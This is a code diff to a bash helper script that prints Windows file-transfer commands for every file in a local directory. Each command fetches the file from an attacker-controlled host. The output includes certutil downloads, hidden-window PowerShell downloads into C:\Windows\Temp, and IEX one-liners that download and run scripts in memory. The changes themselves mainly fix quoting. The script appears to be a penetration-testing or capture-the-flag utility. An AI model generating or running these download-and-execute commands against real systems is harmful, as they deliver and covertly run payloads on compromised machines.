@@ -17,10 +17,11 @@ ls
 echo ""
 
 # 3) Ask user for output directory
-read -p "Enter output directory (press Enter for current directory): " output_dir
+read -r -p "Enter output directory (press Enter for current directory): " output_dir
 if [ -n "$output_dir" ]; then
-  # Remove trailing slash if present
+  # Remove trailing slash if present (handle both / and \)
   output_dir="${output_dir%/}"
+  output_dir="${output_dir%\\}"
   echo "Using output directory: $output_dir"
 else
   echo "Using current directory (no output path specified)"
@@ -31,7 +32,7 @@ echo ""
 echo "Select command type:"
 echo "1) Certutil only"
 echo "2) All commands (certutil + PowerShell variants)"
-read -p "Enter choice [1/2]: " choice
+read -r -p "Enter choice [1/2]: " choice
 
 # only processing files
 files=()
@@ -49,7 +50,7 @@ if [ "$choice" = "1" ]; then
   # Certutil only
   for f in "${files[@]}"; do
     if [ -n "$output_dir" ]; then
-      echo "certutil -f -urlcache -split http://$ip/$f $output_dir\\$f"
+      printf 'certutil -f -urlcache -split http://%s/%s "%s\\%s"\n' "$ip" "$f" "$output_dir" "$f"
     else
       echo "certutil -f -urlcache -split http://$ip/$f"
     fi
@@ -59,7 +60,7 @@ else
   echo "# Certutil"
   for f in "${files[@]}"; do
     if [ -n "$output_dir" ]; then
-      echo "certutil -f -urlcache -split http://$ip/$f $output_dir\\$f"
+      printf 'certutil -f -urlcache -split http://%s/%s "%s\\%s"\n' "$ip" "$f" "$output_dir" "$f"
     else
       echo "certutil -f -urlcache -split http://$ip/$f"
     fi
@@ -69,9 +70,9 @@ else
   echo "# PowerShell Invoke-WebRequest (iwr)"
   for f in "${files[@]}"; do
     if [ -n "$output_dir" ]; then
-      echo "powershell -NoP -W Hidden -c \"iwr http://$ip/$f -UseBasicParsing -OutFile $output_dir\\$f\""
+      printf 'powershell -NoP -W Hidden -c "iwr http://%s/%s -UseBasicParsing -OutFile `\"%s\\%s`\""\n' "$ip" "$f" "$output_dir" "$f"
     else
-      echo "powershell -NoP -W Hidden -c \"iwr http://$ip/$f -UseBasicParsing -OutFile C:\\Windows\\Temp\\$f\""
+      printf 'powershell -NoP -W Hidden -c "iwr http://%s/%s -UseBasicParsing -OutFile C:\\Windows\\Temp\\%s"\n' "$ip" "$f" "$f"
     fi
   done
   echo ""
@@ -79,22 +80,22 @@ else
   echo "# PowerShell WebClient DownloadFile"
   for f in "${files[@]}"; do
     if [ -n "$output_dir" ]; then
-      echo "powershell -NoP -W Hidden -c \"(New-Object Net.WebClient).DownloadFile('http://$ip/$f','$output_dir\\$f')\""
+      printf 'powershell -NoP -W Hidden -c "(New-Object Net.WebClient).DownloadFile('"'"'http://%s/%s'"'"',`'"'"'%s\\%s`'"'"')"\n' "$ip" "$f" "$output_dir" "$f"
     else
-      echo "powershell -NoP -W Hidden -c \"(New-Object Net.WebClient).DownloadFile('http://$ip/$f','C:\\Windows\\Temp\\$f')\""
+      printf 'powershell -NoP -W Hidden -c "(New-Object Net.WebClient).DownloadFile('"'"'http://%s/%s'"'"','"'"'C:\\Windows\\Temp\\%s'"'"')"\n' "$ip" "$f" "$f"
     fi
   done
   echo ""
   
   echo "# PowerShell WebClient DownloadString (execute in memory, no disk)"
   for f in "${files[@]}"; do
-    echo "powershell -NoP -W Hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://$ip/$f')\""
+    printf 'powershell -NoP -W Hidden -c "IEX (New-Object Net.WebClient).DownloadString('"'"'http://%s/%s'"'"')"\n' "$ip" "$f"
   done
   echo ""
   
   echo "# PowerShell Invoke-Expression with iwr (execute in memory)"
   for f in "${files[@]}"; do
-    echo "powershell -NoP -W Hidden -c \"IEX (iwr http://$ip/$f -UseBasicParsing)\""
+    printf 'powershell -NoP -W Hidden -c "IEX (iwr http://%s/%s -UseBasicParsing)"\n' "$ip" "$f"
   done
   echo ""
 fi
